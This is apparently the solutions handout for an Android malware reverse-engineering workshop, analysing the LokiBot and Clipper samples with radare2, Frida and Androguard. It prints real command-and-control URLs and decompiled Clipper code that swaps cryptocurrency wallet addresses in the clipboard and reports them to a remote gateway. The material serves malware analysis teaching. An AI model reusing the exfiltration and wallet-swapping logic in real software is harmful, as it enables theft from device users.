% Solution of Labs
% Axelle Apvrille
% October 2018

<a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">Android RE workshop</span> by <span xmlns:cc="http://creativecommons.org/ns#" property="cc:attributionName">Axelle Apvrille (Fortinet)</span> is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>

# Lab 1. Radare2 on LokiBot

## Question 1

```
# unzip lokibot.apk -d lokibot-unzipped
# cd lokibot-unzipped
# java -jar /opt/axmlprinter/build/libs/axmlprinter-0.1.7.jar AndroidManifest.xml > AndroidManifest.xml.text
# grep -C 7 MAIN AndroidManifest.xml.text
```

The main activity is `fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.MainActivity`.

```
# r2 classes.dex
[0x00024cdc]> aa
[0x00024cdc]> afl~MainActivity
0x00028668    1 8            sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method._init___V
0x00028680    1 106          sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method.abideasfasfasfasfafa__V
0x00028714    9 62           sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method.onActivityResult_IILandroid_content_Intent__V
0x00028764    6 298          method.Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/MainActivity.Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/MainActivity.method.onCreate(Landroid/os/Bundle;)V
```

The methods of MainActivity are:

- a constructor which returns void
- `void abideasfasfasfasfafa()` 
- `void onActivityResult(int, int, Intent)`
- `void onCreate(Bundle)`

## Question 2

```
[0x00024cdc]> pdf @ sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method._init___V
|           ;-- method.public.constructor.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method._init___V:
/ (fcn) sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method._init___V 8
|   sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_MainActivity.method._init___V ();
|           0x00028668      701000000000   invoke-direct {v0}, Landroid/app/Activity.<init>()V ; 0x0
\           0x0002866e      0e00           return-void
```

The constructor simply calls the constructor of the Activity class it inherits from.

## Question 3

```
[0x00025900]> afl~CommandService
0x000258cc    1 34           sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_CommandService.method._init___V
0x00025900   49 3066 -> 3054 method.Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/CommandService.Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/CommandService.method.abideasfasfasfasfafa()V
0x00026534    1 8            sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_CommandService.method.onCreate__V
0x0002654c    1 12           sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_CommandService.method.onHandleIntent_Landroid_content_Intent__V
0x00026584    1 10           sym.Lfsdfsdf_gsdsfsf_gjhghjg_lbljhkjblkjblkjblkj_CommandService.method.onStartCommand_Landroid_content_Intent_II_I
```

So, the address of `abideasfasfasfasfafa()` is `0x00025900`.

## Question 4

We place ourselves at the beginning of the function (`s`), then we disassemble the function (`pdf`) and grep for things that begin with `str.`
```
[0x00024cdc]> s 0x00025900
[0x00025900]> pdf~str.
|      ::   0x00025934      1a00b500       const-string v0, str.f.j_f_s7o1 ; 0x2d47c ; "\r<f.j;f\as7o1`!"
|    :|::   0x0002596e      1a042d05       const-string v4, str.h_z_v9q ; 0x342bd
|  :|:|::   0x000259b6      1a073c05       const-string v7, str.http:__185.206.145.22_sfdsdfsdf ; 0x343b3 ; " http://185.206.145.22/sfdsdfsdf/"
|  :|:|::   0x000259cc      1a078a04       const-string v7, str.d9w___k ; 0x33813
| |:|:|::   0x00025aca      1a060303       const-string v6, str.P_m___N ; 0x31917
| |:|:|::   0x00025ae6      1a069a06       const-string v6, str.6v5a_qe ; 0x35750
| |:|:|::   0x00025af2      1a079906       const-string v7, str.f_we   ; 0x35748
| |:|:|::   0x00025b98      1a06f500       const-string v6, str.D_w0j_w7q1 ; 0x2d8a7 ; "\
...
```

## Question 5

```
[0x00025900]> Cs.. @ str.f.j_f_s7o1
ascii[13] "<f.j;f\as7o1`!"
[0x00025900]> Cs. @ str.f.j_f_s7o1
"<f.j;f\as7o1`!"                                  <--- this is the obfuscated string
```

# Lab 2. Radare2 script to de-obfuscate LokiBot

## Question 1

The algorithm reads the input string from the end and applies, periodically, an XOR with 0x58 (88) and 3.

```python
def deobfuscate(s, key1=88, key2=3):
    result = list(s)
    # s is an obfuscated string
    i = len(s) -1
    while i >= 0:
        result[i] = chr(ord(result[i]) ^ key1)
        i = i -1
        if i >= 0:
            result[i] = chr(ord(result[i]) ^ key2)
        i = i -1
    return ''.join(result)
```


## Question 2

The solution for the script is in `./data/solutions/r2loki.py`

Here are a few de-obfuscated strings:

```
[0x00025900]> #!pipe python ../r2loki.py str.f.j_f_s7o1
Estimated length:  13
Obfuscated hex bytes:  3c662e6a3b660773376f316021
De-obfuscated Result:  device_policy
[0x00025900]> #!pipe python ../r2loki.py str.h_z_v9q
Estimated length:  8
Obfuscated hex bytes:  683d7a3f7639713c
De-obfuscated Result:  keyguard
[0x000342be]> #!pipe python ../r2loki.py str.d9w___k
Estimated length:  8
Obfuscated hex bytes:  6439773d2d286b28
De-obfuscated Result:  gate.php
[0x00033814]> #!pipe python ../r2loki.py str.P_m___N
Estimated length:  8
Obfuscated hex bytes:  503d6d3c5c0b4e0b
De-obfuscated Result:  Send_SMS
```

# Lab 3. Frida on LokiBot

## Question 1

The solution is in `./data/solutions/lokifrida.js` on the USB key.

## Question 2

```
root@90b58e6bc8f4:~# adb shell pm list packages
package:com.android.smoketest
package:com.android.cts.priv.ctsshim
package:com.google.android.youtube
...
package:fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj
...
```

The package name is `fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj`

So, we launch:

```
# frida -D emulator-5554 -l lokifrida.js -f fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj --no-pause
     ____
    / _  |   Frida 12.0.8 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at http://www.frida.re/docs/home/
Spawning `fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj`...         
*] Loading Frida script for Android/LokiBot
[*] Java is available
Spawned `fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj`. Resuming main thread!
[Android Emulator 5554::fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj]-> [*] loaded hooks
de-obfuscating: n!m9n= to: myname
de-obfuscating: zm,f6w
                        f*u1`= to: MyIntentService
de-obfuscating: d9w=-(k( to: gate.php
de-obfuscating: (k7m= to: phone
de-obfuscating: bd=wj6i=`,pbw*v= to: :get_injects:true
de-obfuscating: h to: 0
de-obfuscating: <f.j;fs7o1`! to: device_policy
de-obfuscating: h to: 0
de-obfuscating: h=z?v9q< to: keyguard
de-obfuscating: h to: 0
de-obfuscating: i to: 1
de-obfuscating: d9w=-(k( to: gate.php
de-obfuscating: se to: p=
de-obfuscating: (k7m= to: phone
de-obfuscating: b to: :
de-obfuscating: b to: :
[Android Emulator 5554::fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj]-> quit
```

Note, you might sometimes get errors with Frida like **"Failed to spawn: timeout was reached"**
or **"Failed to load script: the connection is closed"**. 

## Question 3

The solution is on the USB key in `./data/solutions/lokifrida2.js`

- If the Loki process is still up, run `frida -D emulator-5554 -l lokifrida2.js -n fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj --no-pause`,
- otherwise `frida -D emulator-5554 -l lokifrida2.js -f fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj --no-pause` (notice `-n` or `-f`).

```
# frida -D emulator-5554 -l lokifrida2.js -n fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj --no-pause
     ____
    / _  |   Frida 12.0.8 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at http://www.frida.re/docs/home/
Attaching...                                                            
[*] Loading Frida script for Android/LokiBot
[*] Java is available
[*] loaded hooks
[Android Emulator 5554::fsdfsdf.gsdsfsf.fsdfsdf.lbljhkjblkjblkjblkj]-> decoding: h --> 0
Call Stack: dalvik.system.VMStack.getThreadStackTrace(Native Method)
java.lang.Thread.getStackTrace(Thread.java:1566)
fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.absurdityasfasfasfasfafa.abideasfasfasfasfafa(Native Method)
fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.CommandService.abideasfasfasfasfafa(Unknown Source)
fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.CommandService.onHandleIntent(Unknown Source)
android.app.IntentService$ServiceHandler.handleMessage(IntentService.java:68)
android.os.Handler.dispatchMessage(Handler.java:102)
android.os.Looper.loop(Looper.java:154)
android.os.HandlerThread.run(HandlerThread.java:61)

decoding: <f.j;fs7o1`! --> device_policy
Call Stack: dalvik.system.VMStack.getThreadStackTrace(Native Method)
java.lang.Thread.getStackTrace(Thread.java:1566)
fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.absurdityasfasfasfasfafa.abideasfasfasfasfafa(Native Method)
fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.CommandService.abideasfasfasfasfafa(Unknown Source)
fsdfsdf.gsdsfsf.gjhghjg.lbljhkjblkjblkjblkj.CommandService.onHandleIntent(Unknown Source)
android.app.IntentService$ServiceHandler.handleMessage(IntentService.java:68)
android.os.Handler.dispatchMessage(Handler.java:102)
android.os.Looper.loop(Looper.java:154)
android.os.HandlerThread.run(HandlerThread.java:61)
```

# Lab 4. Hacking DEX

## Question 1

```
root@90b58e6bc8f4:~/hackdex# python dexview.py -i classes.dex   
Encoded_method: code_off=304
Encoded_method: code_off=328
Header ----------------------
               Magic: dex
             Version: 035
    Adler32 checksum: 2782750044
      SHA1 signature: 40 6a 48 a8 5f 96 13 e3 ab d0 e1 cd 64 04 ff 95 ba 25 cc 08 
           File size: 752
...
Strings ----------------------
offset=  375 -   381 string=<init>
offset=  383 -   402 string=Hello world in DEX!
offset=  404 -   416 string=Lhelloworld;
```

The string begins at offset **383**.

## Question 2

Modify the executable for example with emacs `hexl-mode`.

Then:
```
root@90b58e6bc8f4:~/hackdex# strings classes.dex | grep DEX
Hackk world in DEX!
root@90b58e6bc8f4:~/hackdex# zip helloworld.zip classes.dex
updating: classes.dex (deflated 44%)
root@90b58e6bc8f4:~/hackdex# adb push helloworld.zip /sdcard/
helloworld.zip: 1 file pushed. 0.0 MB/s (592 bytes in 0.038s)
```

No, the executable does not run because of a bad **checksum** (actually, there is also a bad sha1 hash):

```
root@90b58e6bc8f4:~/hackdex# adb shell dalvikvm -cp /sdcard/helloworld.zip helloworld
Unable to locate class 'helloworld'
java.lang.ClassNotFoundException: Didn't find class "helloworld" on path: DexPathList[[zip file "/sdcard/helloworld.zip"],nativeLibraryDirectories=[/system/lib, /vendor/lib, /system/lib, /vendor/lib]]
	at dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:56)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:380)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:312)
	Suppressed: java.io.IOException: Failed to open dex files from /sdcard/helloworld.zip because: Failure to verify dex file '/sdcard/helloworld.zip': Bad checksum (8c14654a, expected a5dd655c)
```

## Question 3

`python dexview.py -i classes.dex --rehash`

Another way to do it is to both modify a value at a given offset and rehash, both with dexview.

For example, below, we replace the H of Hackk with 0x41 (A).

```bash
# python dexview.py -i classes.dex --patch 41 --offset 383 --rehash
Would you like to rehash? (y/n) y
Patching...
Patching DEX with SHA1 hash: c4 32 24 b1 49 31 74 2c 02 9a ee dc a0 11 0e a6 87 92 73 2b 
Patching DEX with Adler32 checksum: 4100744020
Writing DEX to classes.dex.patched...

Patching DEX with SHA1 hash: f3 d1 98 cd 36 1f ae 3b 38 30 36 af d0 b5 9f 43 44 8e 11 3d 
Patching DEX with Adler32 checksum: 1422812193
Writing DEX to classes.dex.patched...

root@90b58e6bc8f4:~/hackdex# strings classes.dex.patched | grep DEX
Aackk world in DEX!
```

# Lab 5: Androguard on Android/Clipper.A!tr

## Question 1

The main activity is `clipper.abcchannelmc.ru.clipperreborn.MainActivity` (the name won't always be `MainActivity` in all malware!).

```
# androlyze -s
Androlyze version 3.0
In [1]: a, d, dx = AnalyzeAPK('clipper.apk', decompiler='dad')
In [2]: a.get_main_activity()
Out[2]: u'clipper.abcchannelmc.ru.clipperreborn.MainActivity'
```

## Question 2

Service: `clipper.abcchannelmc.ru.clipperreborn.ClipboardService`. A service is code that executes in background.

## Question 3

- `clipper.abcchannelmc.ru.clipperreborn.BootCompletedReceiver`

```
In [3]: a.get_receivers()
Out[3]: ['clipper.abcchannelmc.ru.clipperreborn.BootCompletedReceiver']
```


## Question 4

```java
In [4]: d.CLASS_Lclipper_abcchannelmc_ru_clipperreborn_MainActivity.METHOD_onCreate.source()            
    protected void onCreate(android.os.Bundle p4)
    {
        super.onCreate(p4);
        new Thread(new clipper.abcchannelmc.ru.clipperreborn.MainActivity$1(this)).start();
        this.startService(new android.content.Intent(this, clipper.abcchannelmc.ru.clipperreborn.ClipboardService));
        android.util.Log.d("Clipper", "Started ClipboardManager");
        this.getPackageManager().setComponentEnabledSetting(new android.content.ComponentName(this, clipper.abcchannelmc.ru.clipperreborn.MainActivity), 2, 1);
        android.widget.Toast.makeText(this, this.getResources().getString(2131427368), 0).show();
        this.finish();
        return;
    }
}
```

- calls onCreate() of the parent class
- create a Thread and start it
- start a service named ClipboardService
- log
- remove the icon from the main screen
- toast a message

## Question 5

We see the malware starts a **ClipboardService**

```java
this.startService(new android.content.Intent(this, clipper.abcchannelmc.ru.clipperreborn.ClipboardService));
```

## Question 6

Note there is obviously a URL for the CnC.

```
In [5]: d.CLASS_Lclipper_abcchannelmc_ru_clipperreborn_ClipboardService.METHOD_init.source()
public ClipboardService()
    {
        this.w = "";
        this.gate = "http://fastfrmt.beget.tech/clipper/gateway/";
        this.mOnPrimaryClipChangedListener = new clipper.abcchannelmc.ru.clipperreborn.ClipboardService$3(this);
        return;
    }
```

We will see later that:

- w holds a wallet address
- mOnPrimaryClipChangedListenir holds a clipboard listener

## Question 7

A listener is added by `addPrimaryClipChangedListener`. This listener is the object `this.mOnPrimaryClipChanged` which is instantiated in the constructor.


```java
In [6]: d.CLASS_Lclipper_abcchannelmc_ru_clipperreborn_ClipboardService.METHOD_onCreate.source()
public void onCreate()
    {
        super.onCreate();
        this.mClipboardManager = ((android.content.ClipboardManager) this.getSystemService("clipboard"));
        this.mClipboardManager.addPrimaryClipChangedListener(this.mOnPrimaryClipChangedListener);
        return;
    }

```

## Question 8


This listener contains the malicious payload. 
It grabs the current content of the clipboard and looks by which characters it begins, and tries to guess if this is a crypto currency wallet address and for which crypto currency.

```java
if ((!clipper.abcchannelmc.ru.clipperreborn.ClipboardService.access$100(this.this$0).getText().toString().contains("+7"))
  || (clipper.abcchannelmc.ru.clipperreborn.ClipboardService.access$100(this.this$0).getText().length() != 12)) {
  if ((!v1_5.contains("7")) ||
     (clipper.abcchannelmc.ru.clipperreborn.ClipboardService.access$100(this.this$0).getText().length() != 11)) {
...
```

- Begins with 7 and length 12: Visa QIWI wallet
- Begins with 4: Yandex
- Begins with Z: WebMoney US dollar
- Begins with R: WebMoney Russian Rubles
- Begins with 4 and length 95: Monero
- Begins with 1 or 3 and length 34: Bitcoin
- Begins with X and length 34: Dash
- D and length = 34 -> Doge
- t and length = 35 -> ZEC = ZCash
- 0x and length = 40 -> ETH = Ether
- L and length = 34 -> LTC = Litecoin
- B and length = 34 -> BLK = BlackCoin


## Question 9

```
d.CLASS_Lclipper_abcchannelmc_ru_clipperreborn_ClipboardService.FIELD_gate.show_dref()
########## DREF
R: Lclipper/abcchannelmc/ru/clipperreborn/MainActivity$1; run ()V a
R: Lclipper/abcchannelmc/ru/clipperreborn/ClipboardService$1; run ()V e
R: Lclipper/abcchannelmc/ru/clipperreborn/ClipboardService$2; run ()V e
W: Lclipper/abcchannelmc/ru/clipperreborn/ClipboardService; <init> ()V 12
####################
```

- R: means the field is *read* by the method
- W it is *written*

For method cross references, use `show_xref()`

## Question 10

```java
In [11]: d.CLASS_Lclipper_abcchannelmc_ru_clipperreborn_ClipboardService_1.METHOD_run.source()
public void run()
    {
        try {
            java.io.IOException v0_1 = new StringBuilder();
            v0_1.append(this.this$0.gate);
            v0_1.append("attach.php?log&wallet=");
            v0_1.append(this.val$wallet);
            v0_1.append("&was=");
            v0_1.append(this.val$ne);
            clipper.abcchannelmc.ru.clipperreborn.HttpClient.getReq(v0_1.toString());
            android.util.Log.d("Clipper", "New log");
        } catch (java.io.IOException v0_4) {
            v0_4.printStackTrace();
        } catch (java.io.IOException v0_5) {
            v0_5.printStackTrace();
        }
        return;
    }
```

- Creates URL `http://fastfrmt.beget.tech/clipper/gateway/attach.php?log&wallet=xxx&was=yyy`
- Fills in the old wallet address and the replaced address
- Send HTTP request to CnC



# BONUS Lab 6 APK Signatures

## Question 1

Offset:
```
# python parse_apk.py clipper.apk | grep -A 30 APK
------------- APK Signing Block -------------------
Offset: 2956000 (0x002d1ae0)
```

Signature:
```
				Signature:  7c5ca8f1b535734a69c6c1bf7a8f51fb5f3cf31ea8d63961e15edbb605e51c532b584e3a1be879d6a72e7853e369df857615292147ca725b03c999f42cf6bd27046f17d6307e6bfd18269fc6bb5fbb1a2a914b4b7f4d86955fd948ad64514f8b6229bb9afcf6e235442b4fb754ee0c7ce2333dc9f435f4319bcca53bb8b6847060e1462f11ed3e64da1ffcfb988f29de19285b9c8d394a2d8e4bc8f98984abcd72d07fb7729e5942545ff7943633437fe0916fb629d3b1ffb2690036eeaa3428a71727ee5a6c5ff64a4fc3e2226e0e5d6762d59d352329192f5a06e8bc8cf0c2e9d641e2937cfe8220ce8c65ba3482c528f42d5d30accc88dee283adaa9442af
```

## Question 2

```
root@90b58e6bc8f4:~# adb install hiddenminer.apk 
adb: failed to install hiddenminer.apk: Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl1530970562.tmp/base.apk using APK Signature Scheme v2: SHA-256 digest of contents did not verify]
```

The first message *Failed to collect certificates* is probably an error / improper message.
The likely cause is that the **digest of contents do not verify**.

Precisely, in the APK Signing Block, this value is probably wrong:

```
	Signer #1 length=855 --- 
			Signed data length= 541
				Total digests length:  44
				Digest struct #1
					Length of digest struct:  40
					Digest algo id         : RSASSA-PKCS1-v1_5 with SHA2-256
					Digest length          :  32
-------------------->    	        Digest:  5caefb1cfd3c3e493fdac5f23c3db10623a834095b41020579a9efa908d6ba71
				Total certificates length:  485
			Certificate #1 length=481
```

Wrong: **Digest:  5caefb1cfd3c3e493fdac5f23c3db10623a834095b41020579a9efa908d6ba71**
Note that the digest algorithm id says "RSASSA-PKCS1-v1_5 with SHA2-256". This is incorrect in crypto: the hash algorithm is SHA-256 (not RSA with SHA256).





